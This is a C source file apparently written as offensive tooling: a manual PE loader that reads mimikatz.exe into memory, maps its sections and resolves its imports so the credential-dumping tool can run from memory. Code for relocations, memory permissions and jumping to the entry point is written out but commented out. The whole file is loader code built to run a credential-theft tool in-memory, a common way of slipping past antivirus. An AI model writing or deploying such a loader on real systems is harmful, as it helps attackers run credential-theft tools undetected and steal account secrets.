//
// Created by j4ck on 2/14/24.
//

#include <windows.h>
#include <wchar.h>
#include <stdio.h>

typedef struct _PE_HDRS
{
    PBYTE                    pFileBuffer;
    DWORD                    dwFileSize;

    PIMAGE_NT_HEADERS        pImgNtHdrs;
    PIMAGE_SECTION_HEADER    pImgSecHdr;

    PIMAGE_DATA_DIRECTORY    pEntryImportDataDir;
    PIMAGE_DATA_DIRECTORY    pEntryBaseRelocDataDir;
    PIMAGE_DATA_DIRECTORY    pEntryTLSDataDir;
    PIMAGE_DATA_DIRECTORY    pEntryExceptionDataDir;
    PIMAGE_DATA_DIRECTORY    pEntryExportDataDir;

    BOOL                     bIsDLLFile;

} PE_HDRS, *PPE_HDRS;


typedef struct _BASE_RELOCATION_ENTRY {
    WORD	Offset	: 12;  // Specifies where the base relocation is to be applied.
    WORD	Type	: 4;   // Indicates the type of base relocation to be applied.
} BASE_RELOCATION_ENTRY, * PBASE_RELOCATION_ENTRY;


typedef BOOL(WINAPI* MAIN)();


BOOL InitializePeStruct(PPE_HDRS pPe, LPVOID lpBuffer, DWORD dFileSize) {
    pPe->dwFileSize = dFileSize;
    pPe->pFileBuffer = lpBuffer;

    pPe->pImgNtHdrs               = (PIMAGE_NT_HEADERS)(lpBuffer + ((PIMAGE_DOS_HEADER)lpBuffer)->e_lfanew);

    if (pPe->pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
        return FALSE;

    pPe->bIsDLLFile               = (pPe->pImgNtHdrs->FileHeader.Characteristics & IMAGE_FILE_DLL) ? TRUE : FALSE;
    pPe->pImgSecHdr               = IMAGE_FIRST_SECTION(pPe->pImgNtHdrs);
    pPe->pEntryImportDataDir      = &pPe->pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    pPe->pEntryBaseRelocDataDir   = &pPe->pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    pPe->pEntryTLSDataDir         = &pPe->pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];
    pPe->pEntryExceptionDataDir   = &pPe->pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION];
    pPe->pEntryExportDataDir      = &pPe->pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];

    return TRUE;
}


BOOL LoadFileIntoBuffer(LPVOID* plpBuffer, DWORD* pdFileSize) {
    HANDLE hFile = NULL;
    // Create File Handle
    hFile = CreateFileW(L"mimikatz.exe",
                        GENERIC_ALL,
                        0,
                        NULL,
                        OPEN_EXISTING,
                        FILE_ATTRIBUTE_NORMAL,
                        NULL
    );
    if (hFile == INVALID_HANDLE_VALUE) {
        wprintf(L"[!] CreateFileW Failed to Open File Handle %d\n", GetLastError());
        return FALSE;
    }

    // Get File Size
    *pdFileSize = GetFileSize(hFile, NULL);
    if (*pdFileSize == INVALID_FILE_SIZE) {
        wprintf(L"[!] GetFileSize Failed %d\n", GetLastError());
        return FALSE;
    }

    wprintf(L"[+] Read Mimikatz File Size: %d\n", *pdFileSize);

    // Allocate Memory for File Contents
    *plpBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, *pdFileSize);
    if (*plpBuffer == NULL) {
        wprintf(L"[!] HeapAlloc Failed with Error %d\n", GetLastError());
        return FALSE;
    }

    wprintf(L"[+] Allocated Memory %p\n", *plpBuffer);

    // Read File and Write to Allocated Memory Region (lpBuffer)
    DWORD dBytesWritten = 0;
    if (!ReadFile(hFile, *plpBuffer, *pdFileSize, &dBytesWritten, NULL)) {
        wprintf(L"[!] ReadFile Failed with Error %d\n", GetLastError()) ;
        return FALSE;
    }


    if (hFile) {
        CloseHandle(hFile);
    }
    return TRUE;
}


BOOL FixReloc(IN PIMAGE_DATA_DIRECTORY pEntryBaseRelocDataDir, IN ULONG_PTR pPeBaseAddress, IN ULONG_PTR pPreferableAddress) {

    // Pointer to the beginning of the base relocation block.
    PIMAGE_BASE_RELOCATION pImgBaseRelocation = (PIMAGE_BASE_RELOCATION)(pPeBaseAddress + pEntryBaseRelocDataDir->VirtualAddress);

    // The difference between the current PE image base address and its preferable base address.
    ULONG_PTR uDeltaOffset = pPeBaseAddress - pPreferableAddress;

    // Pointer to individual base relocation entries.
    PBASE_RELOCATION_ENTRY pBaseRelocEntry = NULL;

    // Iterate through all the base relocation blocks.
    while (pImgBaseRelocation->VirtualAddress) {

        // Pointer to the first relocation entry in the current block.
        pBaseRelocEntry = (PBASE_RELOCATION_ENTRY)(pImgBaseRelocation + 1);

        // Iterate through all the relocation entries in the current block.
        while ((PBYTE)pBaseRelocEntry != (PBYTE)pImgBaseRelocation + pImgBaseRelocation->SizeOfBlock) {
            // Process the relocation entry based on its type.
            switch (pBaseRelocEntry->Type) {
                case IMAGE_REL_BASED_DIR64:
                    // Adjust a 64-bit field by the delta offset.
                    *((ULONG_PTR*)(pPeBaseAddress + pImgBaseRelocation->VirtualAddress + pBaseRelocEntry->Offset)) += uDeltaOffset;
                    break;
                case IMAGE_REL_BASED_HIGHLOW:
                    // Adjust a 32-bit field by the delta offset.
                    *((DWORD*)(pPeBaseAddress + pImgBaseRelocation->VirtualAddress + pBaseRelocEntry->Offset)) += (DWORD)uDeltaOffset;
                    break;
                case IMAGE_REL_BASED_HIGH:
                    // Adjust the high 16 bits of a 32-bit field.
                    *((WORD*)(pPeBaseAddress + pImgBaseRelocation->VirtualAddress + pBaseRelocEntry->Offset)) += HIWORD(uDeltaOffset);
                    break;
                case IMAGE_REL_BASED_LOW:
                    // Adjust the low 16 bits of a 32-bit field.
                    *((WORD*)(pPeBaseAddress + pImgBaseRelocation->VirtualAddress + pBaseRelocEntry->Offset)) += LOWORD(uDeltaOffset);
                    break;
                case IMAGE_REL_BASED_ABSOLUTE:
                    // No relocation is required.
                    break;
                default:
                    // Handle unknown relocation types.
                    printf("[!] Unknown relocation type: %d | Offset: 0x%08X \n", pBaseRelocEntry->Type, pBaseRelocEntry->Offset);
                    return FALSE;
            }
            // Move to the next relocation entry.
            pBaseRelocEntry++;
        }

        // Move to the next relocation block.
        pImgBaseRelocation = (PIMAGE_BASE_RELOCATION)pBaseRelocEntry;
    }

    return TRUE;
}

BOOL FixImportAddressTable(IN PIMAGE_DATA_DIRECTORY pEntryImportDataDir, IN PBYTE pPeBaseAddress) {
    for (SIZE_T i =0; i < pEntryImportDataDir->Size; i+=sizeof(IMAGE_IMPORT_DESCRIPTOR)) {
        PIMAGE_IMPORT_DESCRIPTOR currentImportDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)(pPeBaseAddress + pEntryImportDataDir->VirtualAddress + i);

        if (currentImportDescriptor->FirstThunk == 0 && currentImportDescriptor->OriginalFirstThunk == 0)
            break;

        LPSTR cDllName = (LPSTR)(pPeBaseAddress + currentImportDescriptor->Name);
        HANDLE hModule = NULL;

        // See if we can load DLL
        hModule = LoadLibraryA(cDllName);
        if (hModule == NULL) {
            wprintf(L"Failed to Load Library %s GetLastError: %d", cDllName, GetLastError());
            return FALSE;
        }

        // Iterate through imported functions via INT
        SIZE_T		ImgThunkSize                    = 0x00;	// Used to move to the next function (iterating through the IAT and INT)
        ULONG_PTR pFuncAddress = 0;
        PIMAGE_IMPORT_BY_NAME pImgImportByName = NULL;

        while (TRUE) {

            PIMAGE_THUNK_DATA pFirstThunk = (PIMAGE_THUNK_DATA)(pPeBaseAddress + currentImportDescriptor->FirstThunk + ImgThunkSize);
            PIMAGE_THUNK_DATA pOriginalFirstThunk = (PIMAGE_THUNK_DATA)(pPeBaseAddress + currentImportDescriptor->OriginalFirstThunk + ImgThunkSize);

            if (pOriginalFirstThunk->u1.Function == 0 && pFirstThunk->u1.Function == 0) {
                break;
            }

            if (IMAGE_SNAP_BY_ORDINAL(pOriginalFirstThunk->u1.Ordinal)) {
                if ( !(pFuncAddress = (ULONG_PTR)GetProcAddress(hModule, (LPCSTR)IMAGE_ORDINAL(pOriginalFirstThunk->u1.Ordinal))) ) {
                    printf("[!] Could Not Import !%s#%d \n", cDllName, (int)pOriginalFirstThunk->u1.Ordinal);
                    return FALSE;
                }
            }
                // Import function by name
            else {
                pImgImportByName = (PIMAGE_IMPORT_BY_NAME)(pPeBaseAddress + pOriginalFirstThunk->u1.AddressOfData);
                if ( !(pFuncAddress = (ULONG_PTR)GetProcAddress(hModule, pImgImportByName->Name)) ) {
                    printf("[!] Could Not Import !%s.%s \n", cDllName, pImgImportByName->Name);
                    return FALSE;
                }
            }

            // Install the function address in the IAT
            pFirstThunk->u1.Function = (ULONGLONG)pFuncAddress;

            ImgThunkSize += sizeof(IMAGE_THUNK_DATA);

        }

    }
    return TRUE;
}


BOOL FixMemPermissions(IN ULONG_PTR pPeBaseAddress, IN PIMAGE_NT_HEADERS pImgNtHdrs, IN PIMAGE_SECTION_HEADER pImgSecHdr) {

    // Loop through each section of the PE image.
    for (DWORD i = 0; i < pImgNtHdrs->FileHeader.NumberOfSections; i++) {

        // Variables to store the new and old memory protections.
        DWORD	dwProtection		= 0x00,
                dwOldProtection		= 0x00;

        // Skip the section if it has no data or no associated virtual address.
        if (!pImgSecHdr[i].SizeOfRawData || !pImgSecHdr[i].VirtualAddress)
            continue;

        // Determine memory protection based on section characteristics.
        // These characteristics dictate whether the section is readable, writable, executable, etc.

        if (pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_WRITE)
            dwProtection = PAGE_WRITECOPY;

        if (pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_READ)
            dwProtection = PAGE_READONLY;

        if ((pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_WRITE) && (pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_READ))
            dwProtection = PAGE_READWRITE;

        if (pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_EXECUTE)
            dwProtection = PAGE_EXECUTE;

        if ((pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) && (pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_WRITE))
            dwProtection = PAGE_EXECUTE_WRITECOPY;

        if ((pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) && (pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_READ))
            dwProtection = PAGE_EXECUTE_READ;

        if ((pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) && (pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_WRITE) && (pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_READ))
            dwProtection = PAGE_EXECUTE_READWRITE;

        // Apply the determined memory protection to the section.
        if (!VirtualProtect((PVOID)(pPeBaseAddress + pImgSecHdr[i].VirtualAddress), pImgSecHdr[i].SizeOfRawData, dwProtection, &dwOldProtection)) {
            wprintf(L"VirtualProtect Failed %d\n", GetLastError());
            return FALSE;
        }
    }

    return TRUE;
}



BOOL LocalPeExec(IN PPE_HDRS pPe){
    PBYTE			pPeBaseAddress			= NULL;

    if ((pPeBaseAddress = VirtualAlloc(NULL, pPe->pImgNtHdrs->OptionalHeader.SizeOfImage, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)) == NULL) {
        wprintf(L"[!] VirtualAlloc Failed %d", GetLastError()) ;
        return FALSE;
    }

    for (int i = 0; i < pPe->pImgNtHdrs->FileHeader.NumberOfSections; i++) {
        memcpy(
                (PVOID)(pPeBaseAddress + pPe->pImgSecHdr[i].VirtualAddress),			// Distination: pPeBaseAddress + RVA
                (PVOID)(pPe->pFileBuffer + pPe->pImgSecHdr[i].PointerToRawData),		// Source: pPeHdrs->pFileBuffer + RVA
                pPe->pImgSecHdr[i].SizeOfRawData							// Size
        );
    }

    // Fix IAT
    if (!FixImportAddressTable(pPe->pEntryImportDataDir, pPeBaseAddress)) {
        return FALSE;
    }
    /*
    // Fix Base Relocations
    if (!FixReloc(pPe->pEntryBaseRelocDataDir, (ULONG_PTR)pPeBaseAddress, pPe->pImgNtHdrs->OptionalHeader.ImageBase))
        return FALSE;

    // Fix Memory Permissions
    if (!FixMemPermissions((ULONG_PTR)pPeBaseAddress, pPe->pImgNtHdrs, pPe->pImgSecHdr))
        return FALSE;
*/
    //LPVOID EntryPoint = pPeBaseAddress + (ULONG_PTR)(&pPe->pImgNtHdrs->OptionalHeader + pPe->pImgNtHdrs->OptionalHeader.AddressOfEntryPoint);
    //MAIN pMain = (MAIN)EntryPoint;
    //pMain();
}



int wmain() {
    DWORD dFileSize = 0;
    LPVOID lpBuffer = NULL;

    PE_HDRS myPe = { 0 };
    PPE_HDRS pe = &myPe;


    if (!LoadFileIntoBuffer(&lpBuffer, &dFileSize)) {
        return -1;
    }

    wprintf(L"[+] Wrote %d Bytes to Memory %p\n",dFileSize, lpBuffer);

    if (!InitializePeStruct(pe, lpBuffer, dFileSize)) {
        return -1;
    }


    LocalPeExec(pe);

    return 0;
}
